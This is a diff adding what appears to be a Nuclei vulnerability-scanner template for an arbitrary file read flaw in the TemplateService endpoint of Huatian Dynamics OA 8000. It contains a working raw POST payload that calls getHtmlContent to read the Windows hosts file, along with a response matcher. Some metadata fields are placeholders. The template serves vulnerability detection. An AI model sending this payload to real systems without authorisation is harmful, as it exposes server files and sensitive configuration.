@@ -1,0 +1,26 @@
+id: oa8000-TemplateService-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 华天动力OA系统中的TemplateService接口存在一个任意文件读取漏洞，攻击者可以通过构造恶意请求，利用该漏洞读取服务器上的任意文件，包括敏感系统文件和应用程序配置文件等。攻击者可能通过利用此漏洞获取敏感信息，导致潜在的信息泄漏风险。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1
+        Content-Type: text/xml
+        Host: {{Hostname}}
+        Content-Length: 101
+
+        <buffalo-call>
+        <method>getHtmlContent</method>
+        <string>C:/Windows/System32/drivers/etc/hosts</string>
+        </buffalo-call>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Copyright'
